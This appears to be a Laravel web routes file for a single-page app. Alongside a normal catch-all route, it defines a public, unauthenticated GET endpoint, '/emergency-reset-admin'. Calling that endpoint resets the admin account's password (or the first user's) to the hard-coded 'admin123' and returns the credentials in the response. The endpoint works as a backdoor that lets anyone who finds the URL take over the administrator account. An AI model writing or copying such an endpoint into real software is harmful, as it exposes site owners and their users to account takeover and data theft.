<?php

use App\Models\User;
use Illuminate\Support\Facades\Hash;
use Illuminate\Support\Facades\Route;

Route::get('/emergency-reset-admin', function () {
    $user = User::where('username', 'admin')->first();
    if (!$user) {
        $user = User::first();
    }
    if ($user) {
        $user->password = Hash::make('admin123');
        $user->save();
        return response()->json([
            'status' => 'SUCCESS',
            'username' => $user->username,
            'message' => 'Password reset to admin123'
        ]);
    }
    return response()->json(['status' => 'NO_USER_FOUND'], 404);
});

Route::get('/{any}', function () {
    return view('app');
})->where('any', '^(?!api).*$');
